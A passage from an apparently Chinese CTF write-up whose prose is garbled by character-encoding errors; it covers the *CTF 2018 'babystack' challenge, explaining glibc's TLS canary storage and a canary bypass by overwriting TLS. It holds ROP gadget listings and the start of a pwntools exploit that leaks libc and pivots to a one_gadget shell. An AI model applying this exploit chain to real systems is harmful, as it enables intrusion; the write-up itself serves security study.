ˆï¼Œå¹¶ä¸”Canaryä¼šè¢«æ”¾ç½®åœ¨TLSä¸Šã€‚TLSä½äºæ ˆçš„é¡¶éƒ¨ï¼Œå½“æº¢å‡ºé•¿åº¦è¾ƒå¤§æ—¶ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–è¿”å›åœ°å€å‰çš„ Canary å’Œ TLS ä¸­çš„ Canary å®ç°ç»•è¿‡ã€‚</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/41.png" alt="1" style="zoom:50%;" /><h4 id="Glibcä¸­è®¾ç½®Canaryçš„è¿‡ç¨‹"><a href="#Glibcä¸­è®¾ç½®Canaryçš„è¿‡ç¨‹" class="headerlink" title="Glibcä¸­è®¾ç½®Canaryçš„è¿‡ç¨‹"></a>Glibcä¸­è®¾ç½®Canaryçš„è¿‡ç¨‹</h4><p>ä»glibcæºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®šä¹‰äº†<code>THREAD_SET_STACK_GUARD</code>æ—¶ï¼ŒCanaryé€šè¿‡è¿™ä¸ªå®è¢«è®¾ç½®ï¼›å¦åˆ™å­˜å…¥å…¨å±€å˜é‡<code>__stack_chk_guard</code>ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥æŸ¥çœ‹<code>THREAD_SET_STACK_GUARD</code>å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">    THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>THREAD_SETMEM</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå®é€šè¿‡å†…è”æ±‡ç¼–ï¼Œå°†<code>vlaue</code>ï¼Œä¹Ÿå°±æ˜¯Canaryæ”¾å…¥äº†fså¯„å­˜å™¨çš„æŸä¸ªåç§»å¤„ï¼Œè€Œè¿™ä¸ªåç§»å¤„åˆæ˜¯é€šè¿‡<code>offsetof</code>å®å¾—åˆ°çš„<code>pthread</code>ç»“æ„ä½“æŸä¸ªæˆå‘˜çš„åç§»ï¼Œåœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„æ˜¯æˆå‘˜<code>header.stack_guard</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SETMEM(descr, member, value) </span></span><br><span class="line">  (&#123; <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">1</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movb %b0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : <span class="string">&quot;iq&quot;</span> (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">4</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movl %0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : IMM_MODE (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span>      </span><br><span class="line">       &#123;      </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) != <span class="number">8</span>)      </span><br><span class="line">   <span class="comment">/* There should not be any value with a size other than 1,    </span></span><br><span class="line"><span class="comment">      4 or 8.  */</span>      </span><br><span class="line">   <span class="built_in">abort</span> ();      </span><br><span class="line">      </span><br><span class="line"> <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movq %q0,%%fs:%P1&quot;</span> :      </span><br><span class="line">       : IMM_MODE ((<span class="keyword">uint64_t</span>) cast_to_integer (value)),      </span><br><span class="line"> <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">       &#125;&#125;)</span><br></pre></td></tr></table></figure><p><code>pthread</code>æ˜¯ä¸€ä¸ªè¶…å¤§çš„ç»“æ„ä½“ï¼Œè¿™é‡Œç•¥å»ä½™ä¸‹éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="keyword">tcbhead_t</span> header;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Canaryæ­£æ˜¯å­˜å‚¨åœ¨<code>tcbhead_t</code>ä¸­çš„<code>stack_guard</code>ï¼Œæ ¹æ®å˜é‡ç±»å‹å¯ä»¥è®¡ç®—å‡ºåœ¨32ä½å’Œ64ä½ä¸Šçš„åç§»ï¼š</p><p>32ä½ gs:0x14 ï¼ˆ0x4Ã—3+0x4Ã—3+0x4ï¼‰</p><p>64ä½ fs:0x28ï¼ˆ0x8Ã—3+0x4Ã—3+0x8ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">  <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h4 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p><a href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c">é¢˜ç›®åœ°å€</a> <a href="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/libc-2.23.so">libc-2.23.soä¸‹è½½</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//babystack.c</span></span><br><span class="line"><span class="comment">//gcc -fstack-protector-strong -s -pthread babystack.c -o babystack -Wl,-z,now,-z,relro</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    fgets(buf, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span>)atol(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">readn</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> rc;</span><br><span class="line"><span class="keyword">size_t</span> nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (nread &lt; n) &#123;</span><br><span class="line">rc = read(fd, &amp;buf[nread], n-nread);</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (errno == EAGAIN || errno == EINTR) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">nread += rc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">    size = get_long();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    readn(<span class="number">0</span>, input, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> t;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #    ####    #####  ######&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;### ###  #          #    #####&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  # #    #          #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; #   #   #    #     #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;          ####      #    #&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, &amp;start, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pthread_join(t, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¤§ä½“æ€è·¯"><a href="#å¤§ä½“æ€è·¯" class="headerlink" title="å¤§ä½“æ€è·¯"></a>å¤§ä½“æ€è·¯</h5><ul><li>é€šè¿‡paddingçˆ†ç ´å¡«å……aä¿®æ”¹TLSä¸­çš„canaryä¸ºaaaaaaaaï¼Œä»è€Œç»•è¿‡æ ˆæº¢å‡ºä¿æŠ¤ï¼ˆè¿™é‡Œå¿…é¡»æ˜¯çº¿ç¨‹çš„é¢˜ç›®ï¼Œè€Œä¸”è¾“å…¥è¶³å¤Ÿå¤§æ‰è¡Œï¼ï¼‰</li><li>æ³„éœ²å‡ºputsçš„gotåœ°å€å¾—åˆ°çœŸå®çš„åŸºåœ°å€ï¼Œç”¨äºgetshell</li><li>åˆ©ç”¨æ ˆè¿ç§»ï¼Œåœ¨bssæ®µä¸­å¼€è¾Ÿä¸€ä¸ªç©ºé—´æ¥å†™one_gadgetæ¥payload</li></ul><p>æˆ‘ä»¬çœ‹å¤šçº¿ç¨‹ä¸­çš„åæ±‡ç¼–å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å‚æ•°sçš„å¤§å°æ˜¯<strong>0x1010</strong>ï¼Œè€Œv2å¯ä»¥å…è®¸<strong>0x10000</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to babystack 2018!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many bytes do you want to send?&quot;</span>);</span><br><span class="line">  v2 = sub_400906(<span class="string">&quot;How many bytes do you want to send?&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x10000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_400957(<span class="number">0LL</span>, &amp;s, v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s time to say goodbye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are greedy!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹sub_400906å‡½æ•°ï¼Œç»“åˆä¸Šä¸ªå‡½æ•°çš„ä¼ å‚å¯ä»¥çœ‹åˆ°readå‡½æ•°æœ‰æ˜æ˜¾çš„æº¢å‡ºï¼Œä½†æ˜¯æœ‰canaryä¿æŠ¤ï¼Œè€Œä¸”æ˜¯çº¿ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå­¦ä¹ ä¸€ç§æ–°æ‹›å¼ï¼ŒTSLï¼ˆçº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼‰æ”»å‡»ï¼ŒåŸºæœ¬æ€è·¯å°±æ˜¯æˆ‘ä»¬å¾—è¦†ç›–å¾ˆå¤šä¸ªaåˆ°é«˜åœ°å€ï¼Œç›´åˆ°æŠŠTLSç»™è¦†ç›–ä»è€Œä¿®æ”¹äº†canaryçš„å€¼ä¸ºaï¼Œç»•è¿‡äº†canaryåå°±å¯ä»¥æ ˆæº¢å‡ºæ“ä½œäº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400957</span><span class="params">(<span class="keyword">int</span> a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(a1, (<span class="keyword">void</span> *)(v5 + a2), v4 - v5);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *_errno_location() != <span class="number">11</span> &amp;&amp; *_errno_location() != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      v5 += v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾å€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ROPgadget --binary babystack --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400bfc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfe : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c00 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c02 : pop r15 ; ret</span><br><span class="line">0x0000000000400bfb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400bff : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop rbp ; ret</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400bfd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400791 : ret</span><br><span class="line">0x000000000040028b : ret 0x2800</span><br><span class="line">0x000000000040097e : ret 0x8b48</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯è¦†ç›–TLSä¸­çš„cancryå€¼ï¼Œç„¶ååŠ ä¸Šret2libc3é¢˜ç›®çš„æ“ä½œå³å¯</p><div class="note warning modern"><p>ä¸‹é¢ä¸¤ä¸ªPOCéƒ½èƒ½è·‘ï¼Œä½†æ˜¯æ²¡ææ‡‚å¦‚ä½•è®¡ç®—å‡ºæ¥çš„TLSé•¿åº¦ä¸º6218çš„ã€‚ã€‚ã€‚ã€‚</p></div><p>POC1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> context.quiet:</span><br><span class="line">    p = process(<span class="string">&#x27;./babystack&#x27;</span>, env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;How many bytes do you want to send?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1010</span> + <span class="number">2008</span> + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># puts(atol@GOT) to leak a libc address</span></span><br><span class="line">    payload  = p64(<span class="number">0x400c03</span>) <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x601ff0</span>) <span class="comment"># rdi &lt;= atol@GOT</span></span><br><span class="line">    payload += p64(<span class="number">0x4007c0</span>) <span class="comment"># jmp puts@PLT</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(0, 0x602030, SIZE) to write the final payload somewhere in .bss</span></span><br><span class="line">    <span class="comment"># luckily, there is a large value in rdx, 